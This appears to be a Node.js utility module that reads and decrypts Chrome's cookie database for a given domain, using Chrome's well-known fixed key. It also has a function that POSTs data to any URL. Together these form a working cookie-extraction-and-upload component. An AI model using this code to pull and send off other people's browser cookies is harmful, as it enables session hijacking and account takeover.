/***********************************************************************
 *                                                                   _
 *       _____  _                           ____  _                 |_|
 *      |  _  |/ \   ____  ____ __ ___     / ___\/ \   __   _  ____  _
 *      | |_| || |  / __ \/ __ \\ '_  \ _ / /    | |___\ \ | |/ __ \| |
 *      |  _  || |__. ___/. ___/| | | ||_|\ \___ |  _  | |_| |. ___/| |
 *      |_/ \_|\___/\____|\____||_| |_|    \____/|_| |_|_____|\____||_| 
 *                                                                      
 *      ================================================================
 *                 More than a coder, More than a designer              
 *      ================================================================
 *
 *
 *      - Document: cookie.js
 *      - Author: aleen42
 *      - Description: the file is trying to get cookie from chrome. 
 *      - Create Time: Dec 21, 2015
 *      - Update Time: Dec 21, 2015 
 *
 *
 **********************************************************************/
"use strict";

var request = require('request');
var sqlite3 = require('sqlite3');
var crypto = require('crypto');
var chrome = require('chrome-cookies-secure');
// var exec = require('child_proccess').exec;

this.cookie = {
    /**
     * [db: database object]
     * @type {[type]}
     */
    db: null,

    key: null,

    iv: null,

    cipher: null,

    decipher: null,

    /**
     * [init: init function of cookie.js]
     * @param  {[type]} dbPath [the path of cookies of chrome]
     * @return {[type]}        [description]
     */
    init: function(dbPath) {
        "use strict";
        this.db = new sqlite3.Database(dbPath);
        this.key = crypto.pbkdf2Sync('peanuts', 'saltysalt', 1, 128 / 8);
        this.iv = new Buffer((new Array(17)).join(' '), 'binary');
        this.cipher = crypto.createCipheriv('aes-128-cbc', this.key, this.iv);
        this.decipher = crypto.createDecipheriv('aes-128-cbc', this.key, this.iv);
    },

    /**
     * [getCookie: get cookies filted by domain]
     * @param  {[type]} domain [the domain string]
     * @return {[type]}        [description]
     */
    getCookie: function(domain, callback) {
        "use strict";
        /**
         * get cookie
         */
        chrome.getCookies(domain, function(err, cookies) {
            callback(cookies);
        });
    },

    /**
     * [storeData: post to store data of specifical cookies]
     * @param  {[type]}   postUrl  [the url to post]
     * @param  {[type]}   postData [the data to post]
     * @param  {Function} callback [the callback function]
     * @return {[type]}            [description]
     */
    storeData: function(postUrl, postData, callback) {
        "use strict";
        /**
         * callback is null by default
         */
        callback = callback || null;

        /**
         * [request to post]
         */
        request.post(postUrl).form(postData);
    }
}
